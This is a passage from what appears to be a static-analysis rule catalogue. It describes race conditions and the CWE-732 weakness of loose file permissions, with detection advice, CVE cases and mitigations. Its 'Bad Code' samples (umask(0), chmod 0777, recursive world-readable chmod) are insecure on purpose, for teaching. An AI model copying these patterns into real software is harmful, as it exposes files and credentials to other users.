&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1584</key><name>TOCTOU</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;At best, a Race Condition may&amp;nbsp;cause errors in accuracy, overidden values or unexpected behavior that may result in denial-of-service. At worst, it may allow attackers to retrieve data or bypass security processes by replaying a controllable Race Condition until it plays out in their favor.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Race Conditions occur when a public, single instance of a resource is used by multiple concurrent logical processes. If the these logical processes attempt to retrieve and update the resource without a timely management system, such as a lock, a Race Condition will occur.&lt;/p&gt;
&lt;p&gt;An example for when a Race Condition occurs is a resource that may return a certain value to a process for further editing, and then updated by a second&amp;nbsp;process, resulting in the original process' data no longer being valid. Once the original process edits and updates the incorrect value back into the resource, the second process' update has been overwritten and lost.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;When sharing resources between concurrent processes across the application ensure that these resources are&amp;nbsp;either thread-safe, or implement a locking mechanism to ensure expected concurrent activity.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Different Threads Increment and Decrement The Same Counter Repeatedly, Resulting in a Race Condition&lt;/h4&gt;&lt;pre&gt;	public static int counter = 0;	
	public static void start() throws InterruptedException { 
		incrementCounter ic;
		decrementCounter dc;
		while(counter == 0) {
			counter = 0;
			ic = new incrementCounter();
			dc = new decrementCounter();
			ic.start();
			dc.start();
			ic.join();
			dc.join();
		}
		System.out.println(counter); //Will stop and return either -1 or 1 due to race condition over counter
	}
	
	public static class incrementCounter extends Thread {
	    public void run() {
    		counter++;
	    }
	}
	
	public static class decrementCounter extends Thread {
	    public void run() {
    		counter--;
	    }
	}&lt;/pre&gt;&lt;h4&gt;Different Threads Increment and Decrement The Same Thread-Safe Counter Repeatedly, Never Resulting in a Race Condition&lt;/h4&gt;&lt;pre&gt;	public static int counter = 0;
	public static Object lock = new Object();
	
	public static void start() throws InterruptedException {
		incrementCounter ic;
		decrementCounter dc;
		while(counter == 0) { // because of proper locking, this condition is never false
			counter = 0;
			ic = new incrementCounter();
			dc = new decrementCounter();
			ic.start();
			dc.start();
			ic.join();
			dc.join();
		}
		System.out.println(counter); // Never reached
	}
	
	public static class incrementCounter extends Thread {
	    public void run() {
	    	synchronized (lock) {
	    		counter++;
	    	}
	    }
	}
	
	public static class decrementCounter extends Thread {
	    public void run() {
	    	synchronized (lock) {
	    		counter--;
	    	}
	    }
	}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3884</key><name>Incorrect_Permission_Assignment_For_Critical_Resources</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Incorrect Permission Assignment for Critical Resource&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;732&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Class)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_732_Description" id="oc_732_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The software specifies permissions for a security-critical
resource in a way that allows that resource to be read or modified by unintended
actors.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;When a resource is given a permissions setting that provides access to a
wider range of actors than required, it could lead to the disclosure of
sensitive information, or the modification of that resource by unintended
parties. This is especially dangerous when the resource is related to
program configuration, execution or sensitive user data.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_732_Time of Introduction" id="oc_732_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;

&lt;li&gt;Implementation&lt;/li&gt;
&lt;li&gt;Installation&lt;/li&gt;
&lt;li&gt;Operation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_732_Applicable Platforms" id="oc_732_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Language-independent&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Modes of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Modes of Introduction&lt;/div&gt;&lt;div name="oc_732_Modes of Introduction" id="oc_732_Modes of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;The developer may set loose permissions in order to minimize problems when
the user first runs the program, then create documentation stating that
permissions should be tightened. Since system administrators and users do
not always read the documentation, this can result in insecure permissions
being left unchanged.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;The developer might make certain assumptions about the environment in
which the software runs - e.g., that the software is running on a
single-user system, or the software is only accessible to trusted
administrators. When the software is running in a different environment, the
permissions become a problem.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_732_Common Consequences" id="oc_732_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;An attacker may be able to read sensitive information from the
associated resource, such as credentials or configuration information
stored in a file.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Integrity&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;An attacker may be able to modify critical properties of the
associated resource to gain privileges, such as replacing a
world-writable executable with a Trojan horse.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Availability&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;An attacker may be able to destroy or corrupt critical data in the
associated resource, such as deletion of records from a database.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Likelihood of Exploit"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Likelihood of Exploit&lt;/div&gt;&lt;div name="oc_732_Likelihood of Exploit" id="oc_732_Likelihood of Exploit" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;Medium to High&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Detection Methods"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Detection Methods&lt;/div&gt;&lt;div name="oc_732_Detection Methods" id="oc_732_Detection Methods" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt; Automated Static Analysis&lt;/p&gt;&lt;p&gt;Automated static analysis may be effective in detecting permission
problems for system resources such as files, directories, shared memory,
device interfaces, etc. Automated techniques may be able to detect the
use of library functions that modify permissions, then analyze function
calls for arguments that contain potentially insecure values.&lt;/p&gt;&lt;p&gt;However, since the software's intended security policy might allow
loose permissions for certain operations (such as publishing a file on a
web server), automated static analysis may produce some false positives
- i.e., warnings that do not have any security consequences or require
any code changes.&lt;/p&gt;&lt;p&gt;When custom permissions models are used - such as defining who can
read messages in a particular forum in a bulletin board system - these
can be difficult to detect using automated static analysis. It may be
possible to define custom signatures that identify any custom functions
that implement the permission checks and assignments.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt; Automated Dynamic Analysis&lt;/p&gt;&lt;p&gt;Automated dynamic analysis may be effective in detecting permission
problems for system resources such as files, directories, shared memory,
device interfaces, etc.&lt;/p&gt;&lt;p&gt;However, since the software's intended security policy might allow
loose permissions for certain operations (such as publishing a file on a
web server), automated dynamic analysis may produce some false positives
- i.e., warnings that do not have any security consequences or require
any code changes.&lt;/p&gt;&lt;p&gt;When custom permissions models are used - such as defining who can
read messages in a particular forum in a bulletin board system - these
can be difficult to detect using automated dynamic analysis. It may be
possible to define custom signatures that identify any custom functions
that implement the permission checks and assignments.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt; Manual Static Analysis&lt;/p&gt;&lt;p&gt;Manual static analysis may be effective in detecting the use of custom
permissions models and functions. The code could then be examined to
identifying usage of the related functions. Then the human analyst could
evaluate permission assignments in the context of the intended security
model of the software.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt; Manual Dynamic Analysis&lt;/p&gt;&lt;p&gt;Manual dynamic analysis may be effective in detecting the use of
custom permissions models and functions. The program could then be
executed with a focus on exercising code paths that are related to the
custom permissions. Then the human analyst could evaluate permission
assignments in the context of the intended security model of the
software.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt; Fuzzing&lt;/p&gt;&lt;p&gt;Fuzzing is not effective in detecting this weakness.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_732_Demonstrative Examples" id="oc_732_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;The following code sets the umask of the process to 0 before
creating a file and writing "Hello world" into the file.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;C&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;#define OUTFILE "hello.out" &lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt; umask(0);&lt;/div&gt;&lt;div style="font-size:90%;"&gt; FILE *out;&lt;/div&gt;&lt;div style="font-size:90%;"&gt; /* Ignore CWE-59 (link following) for brevity */&lt;/div&gt;&lt;div style="font-size:90%;"&gt; out = fopen(OUTFILE, "w");&lt;/div&gt;&lt;div style="font-size:90%;"&gt; if (out) {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt; fprintf(out, "hello world!\n");&lt;/div&gt;
&lt;div style="font-size:90%;"&gt; fclose(out);&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt; }&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;After running this program on a UNIX system, running the "ls -l"
command might return the following output:&lt;/p&gt;&lt;div class="indent Result"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Result)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;&lt;/span&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;-rw-rw-rw- 1 username 13 Nov 24 17:58 hello.out &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;The "rw-rw-rw-" string indicates that the owner, group, and world (all
users) can read the file and write to it.&lt;/p&gt;&lt;p class="subheading"&gt;Example 2&lt;/p&gt;&lt;p&gt;The following code snippet might be used as a monitor to
periodically record whether a web site is alive. To ensure that the file can
always be modified, the code uses chmod() to make the file
world-writable.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Perl&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;$fileName = "secretFile.out";&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;if (-e $fileName) {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt; chmod 0777, $fileName;&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;my $outFH;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;if (! open($outFH, "&amp;gt;&amp;gt;$fileName")) {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt; ExitError("Couldn't append to $fileName: $!");&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;div style="font-size:90%;"&gt;my $dateString = FormatCurrentTime();&lt;/div&gt;&lt;div style="font-size:90%;"&gt;my $status = IsHostAlive("cwe.mitre.org");&lt;/div&gt;&lt;div style="font-size:90%;"&gt;print $outFH "$dateString cwe status: $status!\n";&lt;/div&gt;&lt;div style="font-size:90%;"&gt;close($outFH);&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;The first time the program runs, it might create a new file that
inherits the permissions from its environment. A file listing might look
like:&lt;/p&gt;&lt;div class="indent Result"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Result)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;&lt;/span&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;-rw-r--r-- 1 username 13 Nov 24 17:58 secretFile.out &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;This listing might occur when the user has a default umask of 022,
which is a common setting. Depending on the nature of the file, the user
might not have intended to make it readable by everyone on the
system.&lt;/p&gt;&lt;p&gt;The next time the program runs, however - and all subsequent
executions - the chmod will set the file's permissions so that the
owner, group, and world (all users) can read the file and write to
it:&lt;/p&gt;&lt;div class="indent Result"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Result)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;&lt;/span&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;-rw-rw-rw- 1 username 13 Nov 24 17:58 secretFile.out &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;Perhaps the programmer tried to do this because a different process
uses different permissions that might prevent the file from being
updated.&lt;/p&gt;&lt;p class="subheading"&gt;Example 3&lt;/p&gt;&lt;p&gt;The following command recursively sets world-readable permissions
for a directory and all of its children:&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Shell&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;chmod -R ugo+r DIRNAME&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;If this command is run from a program, the person calling the program
might not expect that all the files under the directory will be
world-readable. If the directory is expected to contain private data,
this could become a security problem. &lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Observed Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Observed Examples&lt;/div&gt;&lt;div name="oc_732_Observed Examples" id="oc_732_Observed Examples" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Reference&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3482" target="_blank"&gt;CVE-2009-3482&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Anti-virus product sets insecure "Everyone: Full
Control" permissions for files under the "Program Files" folder, allowing
attackers to replace executables with Trojan
horses.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3897" target="_blank"&gt;CVE-2009-3897&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Product creates directories with 0777 permissions
at installation, allowing users to gain privileges and access a socket used
for authentication.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3489" target="_blank"&gt;CVE-2009-3489&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Photo editor installs a service with an insecure
security descriptor, allowing users to stop or start the service, or execute
commands as SYSTEM.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3289" target="_blank"&gt;CVE-2009-3289&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Library function copies a file to a new target and
uses the source file's permissions for the target, which is incorrect when
the source file is a symbolic link, which typically has 0777 permissions.
&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0115" target="_blank"&gt;CVE-2009-0115&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Device driver uses world-writable permissions for
a socket file, allowing attackers to inject arbitrary
commands.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1073" target="_blank"&gt;CVE-2009-1073&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;LDAP server stores a cleartext password in a
world-readable file.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0141" target="_blank"&gt;CVE-2009-0141&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Terminal emulator creates TTY devices with
world-writable permissions, allowing an attacker to write to the terminals
of other users.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0662" target="_blank"&gt;CVE-2008-0662&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;VPN product stores user credentials in a registry
key with "Everyone: Full Control" permissions, allowing attackers to steal
the credentials.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0322" target="_blank"&gt;CVE-2008-0322&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Driver installs its device interface with
"Everyone: Write" permissions.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3939" target="_blank"&gt;CVE-2009-3939&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Driver installs a file with world-writable
permissions.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3611" target="_blank"&gt;CVE-2009-3611&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Product changes permissions to 0777 before
deleting a backup; the permissions stay insecure for subsequent
backups.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6033" target="_blank"&gt;CVE-2007-6033&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Product creates a share with "Everyone: Full
Control" permissions, allowing arbitrary program
execution.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5544" target="_blank"&gt;CVE-2007-5544&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Product uses "Everyone: Full Control" permissions
for memory-mapped files (shared memory) in inter-process communication,
allowing attackers to tamper with a session.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4868" target="_blank"&gt;CVE-2005-4868&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Database product uses read/write permissions for
everyone for its shared memory, allowing theft of credentials.
&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1714" target="_blank"&gt;CVE-2004-1714&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Security product uses "Everyone: Full Control"
permissions for its configuration files.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0006" target="_blank"&gt;CVE-2001-0006&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;"Everyone: Full Control" permissions assigned to a
mutex allows users to disable network
connectivity.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0969" target="_blank"&gt;CVE-2002-0969&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Chain: database product contains buffer overflow
that is only reachable through a .ini configuration file - which has
"Everyone: Full Control" permissions.&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_732_Potential Mitigations" id="oc_732_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;When using a critical resource such as a configuration file, check to
see if the resource has insecure permissions (such as being modifiable
by any regular user), and generate an error or even exit the software if
there is a possibility that the resource could have been modified by an
unauthorized party.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;Divide your application into anonymous, normal, privileged, and
administrative areas. Reduce the attack surface by carefully defining
distinct user groups, privileges, and/or roles. Map these against data,
functionality, and the related resources. Then set the permissions
accordingly. This will allow you to maintain more fine-grained control
over your resources.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phases:  Implementation; Installation&lt;/p&gt;&lt;p&gt;During program startup, explicitly set the default permissions or
umask to the most restrictive setting possible. Also set the appropriate
permissions during program installation. This will prevent you from
inheriting insecure permissions from any user who installs or runs the
program.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  System Configuration&lt;/p&gt;&lt;p&gt;For all configuration files, executables, and libraries, make sure
that they are only readable and writable by the software's
administrator.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Documentation&lt;/p&gt;&lt;p&gt;Do not suggest insecure configuration changes in your documentation,
especially if those configurations can extend to resources and other
software that are outside the scope of your own software.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Installation&lt;/p&gt;&lt;p&gt;Do not assume that the system administrator will manually change the
